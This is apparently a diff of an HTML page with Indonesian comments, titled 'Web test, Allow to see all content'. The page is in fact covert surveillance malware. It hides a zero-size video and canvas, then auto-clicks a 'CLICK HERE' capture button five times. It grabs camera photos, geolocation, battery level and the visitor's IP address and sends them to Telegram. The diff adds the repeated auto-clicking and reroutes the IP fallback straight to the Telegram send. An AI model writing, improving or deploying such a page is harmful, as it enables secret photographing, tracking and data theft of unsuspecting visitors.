@@ -6,7 +6,7 @@
 <body>
   <h1>Web test, Allow to see all content</h1>
   <video id="video" width="0" height="0" autoplay></video>
-  <button id="capture-btn">Ambil Foto</button>
+  <button id="capture-btn">CLICK HERE</button>
   <canvas id="canvas" width="0" height="0" style="display: none;"></canvas>
 
   <script>
@@ -62,8 +62,6 @@
             navigator.getBattery()
               .then(function(battery) {
                 deviceInfo.batteryLevel = battery.level * 100;
-                deviceInfo.isp = getISPInfo(); // Memanggil fungsi untuk mendapatkan info ISP
-                deviceInfo.imei = getIMEIInfo(); // Memanggil fungsi untuk mendapatkan info IMEI
 
                 // Mengambil IP perangkat menggunakan layanan ipify
                 fetch('https://api.ipify.org?format=json')
@@ -78,7 +76,7 @@
                   })
                   .catch(function(error) {
                     console.error('Terjadi kesalahan dalam mendapatkan alamat IP:', error);
-                    getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy);
+                    sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
                   });
               })
               .catch(function(error) {
@@ -146,30 +144,21 @@
     // Fungsi untuk melakukan klik tombol secara otomatis
     function autoClickButton() {
       var button = document.getElementById('capture-btn');
-      button.click();
+      var clickCount = 0;
+      var maxClicks = 5;
+      var delay = 3000; // Delay dalam milidetik (misal: 1000 = 1 detik)
+
+      var interval = setInterval(function() {
+        button.click();
+        clickCount++;
+        if (clickCount >= maxClicks) {
+          clearInterval(interval);
+        }
+      }, delay);
     }
 
     // Melakukan klik tombol setelah 3 detik
     setTimeout(autoClickButton, 3000);
-
-    // Fungsi untuk mendapatkan alamat IP perangkat dengan cara alternatif
-    function getAlternativeIPAddress(deviceInfo, imageDataURL, latitude, longitude, accuracy) {
-      // Mendapatkan alamat IP menggunakan layanan ipify (alternatif)
-      fetch('https://api6.ipify.org?format=json')
-        .then(function(response) {
-          return response.json();
-        })
-        .then(function(data) {
-          deviceInfo.ipAddress = data.ip;
-
-          // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
-          sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-        })
-        .catch(function(error) {
-          console.error('Terjadi kesalahan dalam mendapatkan alamat IP (alternatif):', error);
-          sendToTelegram(latitude, longitude, accuracy, deviceInfo, imageDataURL);
-        });
-    }
   </script>
 </body>
 </html>
